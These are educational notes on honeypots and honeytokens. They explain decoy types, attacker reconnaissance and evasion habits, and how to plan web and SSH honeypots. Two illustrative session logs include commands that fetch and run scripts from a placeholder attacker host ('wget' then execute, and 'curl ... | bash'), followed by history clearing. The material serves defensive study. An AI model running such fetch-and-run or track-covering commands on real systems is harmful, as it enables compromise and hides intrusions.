# Honeypots

* A honeypot is a security mechanism that creates a decoy system, service, or environment designed to lure attackers and study their behavior.

* Our purpose is to study how attackers work. By doing so, we can see some patterns and identify malicious activity early. Also, we can train AI models for this. 

* We understand attacker tactics and techniques.

* Distract attackers from real assets. They are connected to honeypots, and they think they are on the real server. Later, we can **strengthen** the defences of the real system based on the information learned from honeypots.

* In honeypots, we deploy **fake** services such as:
  * SSH server
  * Web server

* We make them seem real and **vulnerable** to lure in attackers. We monitor everything and record their behavior, we log them all. Later, we analyze this data to learn about their behaviors.

* There are different types of honeypots. Some of them are for **research** purposes, where we create honeypots to log stuff about attackers and make a publication out of it. We can also put honeypots in **production**, this is done to detect insider threats. Deployed in real networks.

* We can also classify honeypots as: **low-interaction** where we are simulating some services but not all. This has less data and safer. Also, we have **high-interaction**, where we have fully functional systems. As a gold standard, always isolate your real systems if you have **high-interaction** honeypots because attackers may find a way to infiltrate.

* In order to create a proper honeypot, we must do our research and learn about what the attackers do when they enter one. What are the stuff they are looking for? 

* Otherwise, they would understand and leave immediately. 

* In real life, governments use honeypots to detect cyber-espionage. Financial inst. use them to detect fraud attempts. Universities may deploy them for research and publication.

* So, what do attackers do?

Well, usually they do **recon** first, applying commands such as `whoami`, `ls` to see the OS, the privileges, folders and users. They also try to be the `root` user, they sometimes brute-force passwords or try using some known exploits. They can also create new users and install backdoors for future logins. They can look for stealing data by searching for passwords, files, secret stuff. They can install **malware**, such as ransomware, crypto miners, botnets, etc. They usually cover their tracks by removing the downloaded files, tamper with history files. 

Advanced attackers:
* They check timings. If the disk is too slow or too fast, it might be fake?
* They test for anomalies. Maybe the responses look fake. Not realistic.

An example log:
```bash
login as: root
root@honeypot's password: (attacker guessed or default password accepted)

Last login: Fri Apr 26 18:00:00 2025
# First they check who they are
$ whoami
root

# Check system info
$ uname -a
Linux ubuntu 5.4.0-26-generic #30-Ubuntu SMP x86_64 GNU/Linux

# Check network interfaces
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255

# List what's in the root directory
$ ls /
bin   boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  tmp  usr  var

# Go into /tmp to upload malware (tmp is writable!)
$ cd /tmp

# Download malware payload (they think this is a real system)
$ wget http://badguy-server.com/malware.sh
--2025-04-26 18:01:02--  http://badguy-server.com/malware.sh
Resolving badguy-server.com... 198.51.100.22
Connecting to badguy-server.com... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1240 (1.2K) [application/x-sh]

# Give it permissions
$ chmod +x malware.sh

# Execute it
$ ./malware.sh

# Try to cover tracks
$ rm malware.sh

# Try to clear history
$ history -c

# Close session
$ exit
```

* Here, we see that attacker believes that it is a real system
* As seen, they download a malware and try to run it.
  * This can be a miner, a botnet, etc.
* They deleted the file and deleted the history.


Now, another log for now an advanced user.

```bash
login as: admin
admin@honeypot's password: (attacker guessed or default password accepted)

Last login: Fri Apr 26 19:00:00 2025
# First: who am I?
$ whoami
admin

# Next: check kernel and system info
$ uname -a
Linux ubuntu 5.4.0-26-generic #30-Ubuntu SMP x86_64 GNU/Linux

# Check disk info - is it real?
$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/root        20G   5G   14G  26% /

# Check running processes
$ ps aux
root         1  0.0  0.1  22532  3724 ?        Ss   19:00   0:00 /sbin/init
root        11  0.0  0.0  20136  2892 ?        Ss   19:00   0:00 /usr/sbin/sshd

# Scan localhost ports
$ netstat -tulnp
(Not much open... hmm...)

# Suspicious: very few services running!

# Check hardware details
$ lshw -short
H/W path        Device      Class          Description
=======================================================
system                      Computer
/0                          Motherboard
/0/0                        CPU             Virtual CPU

# Realize: It’s a VM! Might be a trap!

# Try to ping an external site
$ ping -c 1 8.8.8.8
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=12.3 ms

# External network works fine.

# Try uploading a small script to test filesystem behavior
$ echo "test" > testfile.txt
$ cat testfile.txt
test

# Test file permissions
$ touch /root/test
touch: cannot touch '/root/test': Permission denied

# Hmmm... strange permissions.

# Get suspicious. Try to run a fake local exploit to "scare" admins
$ curl http://badguy-server.com/fake-exploit.sh | bash

# Wait and see if anyone kicks them out manually

# Pause... looking for response...

# No response.

# Decide: "this might be a honeypot" — LEAVE
$ exit
```

* First the attacker tested to see if the environment was real.
  * Checked disk size, running services, hardware info.
* The machine was too clean!
* Before downloading the malware, attacker tried to run a file to see what would happen.
  * Nothing happened, decided it is a honeypot and left.

---

So, we can create SSH honeypots, web honeypots and database honeypots. Let's create a web honeypot. 

In a web honeypot, first we decide the pages we will build.

* `/` - The index page. 
* `/login` - Fake login page
* `/upload` - Fake file upload page
* `/admin` - Fake admin panel, forbidden access message
* `/dashboard` - optional, for us to see the inputs given by attackers

In the honeypot, our aim is to **log** everything.

* IP address
* Request method (GET, POST, etc)
* Path
* Payload (for POST)
* User-Agent

---

At this point, we can improve our application too. For example, Wordpress is very popular. Maybe, we are trying to learn how they attack *wordpress* websites. So, we can just change our title and add some fake files such as `wp-login.php`, `/wp-admin` and see what happens.

We can also put some fake files to see if people are looking for them: `/config.php`, `passwords.txt` etc.

---

## SSH honeypot

Building an SSH honeypot is much harder because there are a lot of moving parts. For that reason, there are readily available ones such as: `cowrie` 

However, even if we want to build by ourselves, we are still going to use some libraries to handle certain tasks, such as SSH, encryption etc. For that we can use `paramiko`.

Later, we need to handle authentication. We need to **fake** a shell. We need to log everything. We need to prevent attackers reaching the real server -- that means good sandboxing. Since we are using a real SSH server, we need to simulate a fake file system in memory.

However, should be noted that GPT or LLM's are very good at giving meaningful answers. For example, Anıl Sezgin has recently published a paper where he used LLM's to create a honeypot for REST API.

---

Check out here for further honeypot examples: https://github.com/paralax/awesome-honeypots?tab=readme-ov-file


---

# Honeytoken

* Honeytoken is a decoy—such as a fake document, API key, database entry, or email—that has no legitimate purpose in your system. When an attacker interacts with it, the action is immediately flagged as suspicious, alerting your security team.

* Sometimes people share some images where the tokens and keys can be read.
  * These can be fake!
  * They will work but because they are keys to honeypots.

* Common types of honeytokens are credentials (fake username, password, api token etc), documents (dummy files such as passwords.txt, financialreport.docx), fake rows in db, email addresses (unused) etc.

* 




